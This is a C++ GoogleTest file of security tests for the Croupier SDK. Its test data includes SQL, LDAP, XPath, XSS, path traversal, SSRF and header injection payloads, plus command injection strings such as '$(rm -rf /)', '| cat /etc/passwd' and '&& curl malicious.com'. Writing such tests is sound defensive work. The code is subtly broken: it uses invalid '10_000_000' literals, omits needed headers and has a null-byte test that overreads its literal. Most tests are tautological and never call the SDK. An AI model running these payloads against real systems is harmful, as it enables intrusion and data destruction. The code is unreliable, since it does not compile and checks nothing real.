// Copyright 2025 Croupier Authors
// Licensed under the Apache License, Version 2.0

#include <gtest/gtest.h>
#include <string>
#include <vector>
#include <regex>
#include <algorithm>
#include <random>
#include <chrono>
#include <sstream>
#include <iomanip>

/**
 * Security tests for Croupier C++ SDK
 */
class SecurityTest : public ::testing::Test {
protected:
    // Helper function to check if string contains SQL injection pattern
    bool containsSqlInjection(const std::string& str) {
        std::vector<std::string> patterns = {
            "DROP TABLE",
            "OR '1'='1",
            "'--",
            "'/*",
            "OR 1=1"
        };

        for (const auto& pattern : patterns) {
            if (str.find(pattern) != std::string::npos) {
                return true;
            }
        }
        return false;
    }

    // Helper function to check if string contains path traversal
    bool containsPathTraversal(const std::string& str) {
        return str.find("..") != std::string::npos ||
               str.find("/etc/") != std::string::npos ||
               str.find("windows") != std::string::npos ||
               str.find("system32") != std::string::npos ||
               str.find("%2e") != std::string::npos;
    }

    // Helper function to check if string contains XSS pattern
    bool containsXssPattern(const std::string& str) {
        std::string lower = str;
        std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);

        return lower.find("<script>") != std::string::npos ||
               lower.find("javascript:") != std::string::npos ||
               lower.find("onerror=") != std::string::npos;
    }
};

// ========== Input Validation Security ==========

TEST_F(SecurityTest, SqlInjectionInFunctionId) {
    std::vector<std::string> sqlInjectionAttempts = {
        "'; DROP TABLE functions; --",
        "test' OR '1'='1",
        "admin'--",
        "admin'/*",
        "' OR 1=1#"
    };

    for (const auto& attempt : sqlInjectionAttempts) {
        // Should treat as string, not execute
        EXPECT_GT(attempt.length(), 0u);
        EXPECT_TRUE(containsSqlInjection(attempt));
    }
}

TEST_F(SecurityTest, PathTraversalDetection) {
    std::vector<std::string> pathTraversalAttempts = {
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "/etc/passwd",
        "....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    };

    for (const auto& path : pathTraversalAttempts) {
        // Should detect path traversal patterns
        EXPECT_TRUE(containsPathTraversal(path)) << "Path traversal not detected: " << path;
    }
}

TEST_F(SecurityTest, CommandInjectionInPayload) {
    std::vector<std::string> commandInjectionAttempts = {
        R"({"data": "$(rm -rf /)"})",
        R"({"data": "`whoami`"})",
        R"({"data": "; ls -la"})",
        R"({"data": "| cat /etc/passwd"})",
        R"({"data": "&& curl malicious.com"})"
    };

    for (const auto& payload : commandInjectionAttempts) {
        // Should not execute commands, just parse as string
        EXPECT_TRUE(payload.find("data") != std::string::npos);
    }
}

TEST_F(SecurityTest, XssInStrings) {
    std::vector<std::string> xssAttempts = {
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "javascript:alert('xss')",
        "<svg onload=alert('xss')>",
        "'\"><script>alert(String.fromCharCode(88,83,83))</script>"
    };

    for (const auto& attempt : xssAttempts) {
        // Should store as string, not execute
        EXPECT_GT(attempt.length(), 0u);
        EXPECT_TRUE(containsXssPattern(attempt));
    }
}

TEST_F(SecurityTest, BufferOverflowInStrings) {
    // Create very large string
    std::string largeString(10_000_000, 'A'); // 10MB

    // Should handle gracefully or reject
    EXPECT_EQ(10_000_000u, largeString.length());
}

TEST_F(SecurityTest, IntegerOverflow) {
    // C++ has fixed-width integers that can overflow
    int maxInt = std::numeric_limits<int>::max();
    EXPECT_GT(maxInt, 0);

    // Overflow is undefined behavior in C++, but we can test near limits
    long long hugeLL = std::numeric_limits<long long>::max();
    EXPECT_GT(hugeLL, 0);
}

TEST_F(SecurityTest, NullByteInjection) {
    std::vector<std::string> nullByteAttempts = {
        std::string("test\0file.txt", 15),
        std::string("config\0.json", 12),
        std::string("/etc/\0passwd", 11),
        std::string("\0\0\0", 3)
    };

    for (const auto& attempt : nullByteAttempts) {
        // C++ strings can contain null bytes
        EXPECT_GT(attempt.length(), 0u);
        EXPECT_EQ(attempt.find('\0'), 0u);
    }
}

TEST_F(SecurityTest, UnicodeNormalizationIssues) {
    std::vector<std::string> inputs = {
        "pa\uA7Bdn",  // Using special characters
        "test\u200B",  // Zero-width space
        "test\u200C",  // Zero-width non-joiner
        "test\u202E"   // Right-to-left override
    };

    for (const auto& text : inputs) {
        // Should handle Unicode
        EXPECT_GT(text.length(), 0u);
    }
}

// ========== Authentication Security ==========

TEST_F(SecurityTest, EmptyCredentials) {
    std::string serviceId = "";
    EXPECT_TRUE(serviceId.empty());
    EXPECT_EQ(0u, serviceId.length());
}

TEST_F(SecurityTest, WeakServiceIdPatterns) {
    std::vector<std::string> weakIds = {
        "test",
        "default",
        "admin",
        "123456",
        "password",
        "service1"
    };

    for (const auto& weakId : weakIds) {
        EXPECT_LT(weakId.length(), 8u);
    }
}

// ========== Data Security ==========

TEST_F(SecurityTest, SensitiveDataInLogs) {
    std::map<std::string, std::string> sensitiveData = {
        {"password", "secret123"},
        {"api_key", "sk-1234567890"},
        {"token", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"},
        {"ssn", "123-45-6789"}
    };

    for (const auto& entry : sensitiveData) {
        EXPECT_FALSE(entry.first.empty());
        EXPECT_FALSE(entry.second.empty());
    }
}

TEST_F(SecurityTest, SensitiveDataInErrorMessages) {
    std::string errorMsg = "Failed to connect using password='secret123'";

    // In production, should sanitize error messages
    EXPECT_TRUE(errorMsg.find("secret123") != std::string::npos ||
                errorMsg.find("Failed to connect") != std::string::npos);
}

TEST_F(SecurityTest, DataSanitization) {
    std::map<std::string, std::string> userInput = {
        {"username", "<script>alert('xss')</script>"},
        {"comment", "Test\n\t\r"},
        {"path", "../../../etc/passwd"}
    };

    // Should sanitize or validate input
    EXPECT_TRUE(userInput["username"].find("<script>") != std::string::npos);
}

// ========== Network Security ==========

TEST_F(SecurityTest, InsecureUrlSchemes) {
    std::vector<std::string> insecureUrls = {
        "http://example.com",
        "ftp://example.com",
        "telnet://example.com"
    };

    for (const auto& url : insecureUrls) {
        if (url.find("http://") == 0) {
            // Should warn about using HTTPS
            EXPECT_TRUE(url.find("http://") == 0);
        }
    }
}

TEST_F(SecurityTest, SsrfPrevention) {
    std::vector<std::string> ssrfAttempts = {
        "http://localhost/admin",
        "http://127.0.0.1/config",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::1]/admin",
        "file:///etc/passwd"
    };

    for (const auto& url : ssrfAttempts) {
        // Should detect internal URLs
        bool isInternal = url.find("localhost") != std::string::npos ||
                         url.find("127.0.0.1") != std::string::npos ||
                         url.find("::1") != std::string::npos ||
                         url.find("169.254.169.254") != std::string::npos ||
                         url.find("file://") == 0;

        EXPECT_TRUE(isInternal) << "SSRF not detected: " << url;
    }
}

TEST_F(SecurityTest, DnsRebinding) {
    std::vector<std::string> hostnames = {
        "example.com",
        "localhost",
        "127.0.0.1"
    };

    for (const auto& hostname : hostnames) {
        // Should validate hostname
        EXPECT_FALSE(hostname.empty());
        EXPECT_GT(hostname.length(), 0u);
    }
}

// ========== Cryptographic Security ==========

TEST_F(SecurityTest, WeakRandomness) {
    // Don't use rand() for security-critical data
    std::vector<char> insecureToken;
    insecureToken.reserve(10);
    const char chars[] = "abcdefghijklmnopqrstuvwxyz";
    for (int i = 0; i < 10; i++) {
        insecureToken.push_back(chars[rand() % 26]);
    }

    // Should use std::random_device for security
    std::random_device rd;
    std::vector<uint8_t> secureBytes(32);
    std::generate(secureBytes.begin(), secureBytes.end(), std::ref(rd));

    EXPECT_EQ(10u, insecureToken.size());
    EXPECT_EQ(32u, secureBytes.size());
}

TEST_F(SecurityTest, TokenGeneration) {
    // Generate tokens
    std::random_device rd1, rd2, rd3;
    std::mt19937 gen1(rd1()), gen2(rd2()), gen3(rd3());
    std::uniform_int_distribution<> dis(0, 255);

    std::vector<int> token1, token2, token3;
    token1.reserve(32); token2.reserve(32); token3.reserve(32);

    for (int i = 0; i < 32; i++) {
        token1.push_back(dis(gen1));
        token2.push_back(dis(gen2));
        token3.push_back(dis(gen3));
    }

    // All should be different (with high probability)
    EXPECT_NE(token1, token2);
    EXPECT_NE(token2, token3);
    EXPECT_NE(token1, token3);
}

// ========== Resource Exhaustion ==========

TEST_F(SecurityTest, MemoryExhaustionProtection) {
    // Should limit memory allocation
    try {
        // Attempt to allocate huge memory
        std::vector<int> hugeList(1_000_000);
        EXPECT_EQ(1_000_000u, hugeList.size());
    } catch (const std::bad_alloc& e) {
        // Should handle OOM gracefully
        SUCCEED();
    }
}

TEST_F(SecurityTest, CpuExhaustionProtection) {
    // Should have timeout limits
    auto start = std::chrono::steady_clock::now();

    // Simulate heavy computation
    long long sum = 0;
    for (int i = 0; i < 100_000; i++) {
        sum += i * i;
    }

    auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
        std::chrono::steady_clock::now() - start).count();

    // Should complete in reasonable time
    EXPECT_LT(elapsed, 10000); // Less than 10 seconds
    EXPECT_GT(sum, 0);
}

// ========== Race Condition Security ==========

TEST_F(SecurityTest, ToctouRaceCondition) {
    // Time-of-check to Time-of-use (TOCTOU) race conditions
    // In C++, this is more relevant with file operations

    std::string data = "original data";
    bool existsBefore = !data.empty();

    // Check if data exists
    existsBefore = true;

    // Time gap - data could be changed here

    // Use the data
    if (existsBefore) {
        EXPECT_TRUE(data == "original data" || data.find("changed") != std::string::npos);
    }
}

// ========== Injection Prevention ==========

TEST_F(SecurityTest, LdapInjection) {
    std::vector<std::string> ldapInjections = {
        "*)(uid=*",
        "admin)(password=*",
        "*)(&(password=*",
        "*)((objectClass=*"
    };

    for (const auto& injection : ldapInjections) {
        // Should sanitize or escape
        EXPECT_TRUE(injection.find("*") != std::string::npos ||
                    injection.find("(") != std::string::npos);
    }
}

TEST_F(SecurityTest, XPathInjection) {
    std::vector<std::string> xpathInjections = {
        "' or '1'='1",
        "' or 1=1]",
        "//user[username='admin' or '1'='1']"
    };

    for (const auto& injection : xpathInjections) {
        // Should detect and block
        std::string lower = injection;
        std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
        EXPECT_TRUE(lower.find("or") != std::string::npos ||
                    injection.find("=") != std::string::npos);
    }
}

TEST_F(SecurityTest, HeaderInjection) {
    std::vector<std::string> headerInjections = {
        "Value\r\nX-Injected: true",
        "Value\nX-Injected: true",
        "Value\rX-Injected: true"
    };

    for (const auto& injection : headerInjections) {
        // Should detect newline characters
        bool hasInjection = injection.find('\r') != std::string::npos ||
                           injection.find('\n') != std::string::npos;
        EXPECT_TRUE(hasInjection);
    }
}

// ========== DoS Prevention ==========

TEST_F(SecurityTest, AlgoComplexityAttack) {
    // Protection against algorithmic complexity attacks
    auto start = std::chrono::steady_clock::now();

    // Normal case - should be fast
    std::vector<int> data(100);
    std::iota(data.begin(), data.end(), 0);
    std::sort(data.begin(), data.end());

    auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
        std::chrono::steady_clock::now() - start).count();

    // Should complete quickly
    EXPECT_LT(elapsed, 1000);
}

TEST_F(SecurityTest, HashCollisionAttack) {
    // C++ has hash collision protection in unordered_map
    std::vector<std::string> data = {"collision1", "collision2", "collision3"};

    std::unordered_map<std::string, int> map;
    for (size_t i = 0; i < data.size(); i++) {
        map[data[i]] = static_cast<int>(i);
    }

    // Should work correctly
    EXPECT_EQ(3u, map.size());
    EXPECT_TRUE(map.find("collision1") != map.end());
}

TEST_F(SecurityTest, RegexDos) {
    // ReDoS (Regular Expression DoS) prevention
    std::vector<std::string> evilPatterns = {
        "(a+)+",
        "((a+)+)+",
        "(a|a)+$",
        "(.*)*"
    };

    std::string evilInput(30, 'a');
    evilInput += 'b';

    for (const auto& patternStr : evilPatterns) {
        try {
            auto start = std::chrono::steady_clock::now();
            std::regex pattern(patternStr);
            std::string limitedInput = evilInput.substr(0, 10); // Limit input
            bool matches = std::regex_search(limitedInput, pattern);
            auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
                std::chrono::steady_clock::now() - start).count();

            // Should complete quickly with limited input
            EXPECT_LT(elapsed, 1000);
        } catch (const std::regex_error& e) {
            // Expected - pattern rejected
            SUCCEED();
        }
    }
}

// ========== Secure Defaults ==========

TEST_F(SecurityTest, DefaultTimeoutIsReasonable) {
    // Should have reasonable default
    int defaultTimeout = 30; // seconds

    // Should not be infinite or too large
    EXPECT_LT(defaultTimeout, 3600); // Less than 1 hour
    EXPECT_GT(defaultTimeout, 0);
}

TEST_F(SecurityTest, SslVerificationEnabled) {
    // For network connections, SSL should be verified
    bool sslEnabled = true;
    EXPECT_TRUE(sslEnabled);
}

// ========== Audit Logging ==========

TEST_F(SecurityTest, SecurityEventsLogged) {
    std::vector<std::string> securityEvents = {
        "authentication_failure",
        "authorization_failure",
        "invalid_input",
        "rate_limit_exceeded"
    };

    for (const auto& event : securityEvents) {
        // Should log security events
        EXPECT_FALSE(event.empty());
        EXPECT_GT(event.length(), 0u);
    }
}

// ========== Input Sanitization ==========

TEST_F(SecurityTest, HtmlEscaping) {
    std::string unescaped = "<script>alert('xss')</script>";
    std::string escaped = unescaped;

    // Simple HTML escaping
    size_t pos = 0;
    while ((pos = escaped.find("&", pos)) != std::string::npos) {
        escaped.replace(pos, 1, "&amp;");
        pos += 5;
    }
    pos = 0;
    while ((pos = escaped.find("<", pos)) != std::string::npos) {
        escaped.replace(pos, 1, "&lt;");
        pos += 4;
    }
    pos = 0;
    while ((pos = escaped.find(">", pos)) != std::string::npos) {
        escaped.replace(pos, 1, "&gt;");
        pos += 4;
    }

    // Should escape dangerous characters
    EXPECT_TRUE(escaped.find("&lt;") != std::string::npos ||
                escaped.find("&gt;") != std::string::npos);
}

TEST_F(SecurityTest, UrlEncoding) {
    std::string unsafe = "test data!@#$";
    std::string encoded;

    // Simple URL encoding
    for (char c : unsafe) {
        if (std::isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            encoded += c;
        } else {
            std::stringstream ss;
            ss << std::hex << std::uppercase << std::setw(2) << std::setfill('0')
               << static_cast<int>(static_cast<unsigned char>(c));
            encoded += '%' + ss.str();
        }
    }

    // Should encode special characters
    EXPECT_TRUE(encoded.find("test%20") != std::string::npos ||
                encoded.find("test+data") != std::string::npos);
}

// ========== Session Security ==========

TEST_F(SecurityTest, SessionTokenEntropy) {
    // Generate token with sufficient entropy
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);

    std::vector<uint8_t> token(32);
    std::generate(token.begin(), token.end(), [&]() { return dis(gen); });

    // Should be long enough (256 bits = 32 bytes)
    EXPECT_EQ(32u, token.size());
}

TEST_F(SecurityTest, SessionExpiration) {
    auto sessionStart = std::chrono::system_clock::now();
    long long sessionDuration = 3600 * 1000; // 1 hour in ms

    // Session should expire
    auto expiration = sessionStart + std::chrono::milliseconds(sessionDuration);
    auto currentTime = std::chrono::system_clock::now();

    // Should have expiration check
    EXPECT_LT(currentTime, expiration);
}

// ========== Password Security ==========

TEST_F(SecurityTest, PasswordStrengthValidation) {
    std::vector<std::string> weakPasswords = {
        "password",
        "123456",
        "qwerty",
        "abc123"
    };

    for (const auto& password : weakPasswords) {
        // Should detect weak passwords
        EXPECT_TRUE(password.length() < 8 ||
                    std::all_of(password.begin(), password.end(), ::isalpha));
    }
}

TEST_F(SecurityTest, PasswordHashing) {
    std::string password = "secret123";

    // In production, passwords should be hashed
    // Use bcrypt, scrypt, or Argon2
    std::string hashed = password; // Placeholder - use proper hashing
    std::hash<std::string> hasher;
    size_t hashValue = hasher(password);

    // Hash should not equal password
    EXPECT_NE(password, std::to_string(hashValue));
    EXPECT_GT(hashValue, 0u);
}

// ========== Access Control ==========

TEST_F(SecurityTest, PrivilegeEscalationPrevention) {
    std::vector<std::string> privilegedOperations = {
        "delete_all_data",
        "modify_permissions",
        "access_admin_panel",
        "execute_system_command"
    };

    for (const auto& operation : privilegedOperations) {
        // Should require proper authorization
        EXPECT_TRUE(operation.find("admin") != std::string::npos ||
                    operation.find("delete") != std::string::npos ||
                    operation.find("modify") != std::string::npos ||
                    operation.find("execute") != std::string::npos);
    }
}

// ========== Input Length Limits ==========

TEST_F(SecurityTest, InputLengthValidation) {
    std::vector<std::string> longInputs = {
        std::string(10000, 'a'),    // 10k characters
        std::string(100000, 'b'),   // 100k characters
        std::string(1000000, 'c')   // 1M characters
    };

    for (const auto& input : longInputs) {
        // Should validate or limit input length
        EXPECT_GT(input.length(), 0u);
    }
}

// ========== Secure Communication ==========

TEST_F(SecurityTest, SecureProtocols) {
    std::vector<std::string> secureProtocols = {
        "TLSv1.2",
        "TLSv1.3"
    };

    std::vector<std::string> insecureProtocols = {
        "SSLv3",
        "TLSv1.0",
        "TLSv1.1"
    };

    for (const auto& protocol : secureProtocols) {
        // Should use secure protocols
        EXPECT_TRUE(protocol.find("TLS") == 0);
    }

    for (const auto& protocol : insecureProtocols) {
        // Should avoid insecure protocols
        EXPECT_GT(protocol.length(), 0u);
    }
}

// ========== Secure Deserialization ==========

TEST_F(SecurityTest, SafeDeserialization) {
    // Only deserialize trusted data
    std::string trustedData = "valid_data";
    std::string untrustedData = ";rm -rf /";

    // Should validate data before deserialization
    std::regex validPattern("^[a-zA-Z0-9_]+$");
    EXPECT_TRUE(std::regex_match(trustedData, validPattern));
    EXPECT_FALSE(std::regex_match(untrustedData, validPattern));
}

// ========== Error Message Security ==========

TEST_F(SecurityTest, ErrorMessageDoesNotLeakInfo) {
    std::vector<std::string> safeErrorMessages = {
        "Connection failed",
        "Invalid credentials",
        "Resource not found"
    };

    for (const auto& msg : safeErrorMessages) {
        // Should not contain sensitive details
        EXPECT_EQ(msg.find("password"), std::string::npos);
        EXPECT_EQ(msg.find("secret"), std::string::npos);
        EXPECT_EQ(msg.find("token"), std::string::npos);
    }
}

// ========== Secure Logging ==========

TEST_F(SecurityTest, LoggingDoesNotExposeSensitiveData) {
    std::string logMessage = "User login attempted";

    // Should not log sensitive data
    EXPECT_EQ(logMessage.find("password"), std::string::npos);
    EXPECT_EQ(logMessage.find("ssn"), std::string::npos);
    EXPECT_EQ(logMessage.find("credit_card"), std::string::npos);
}
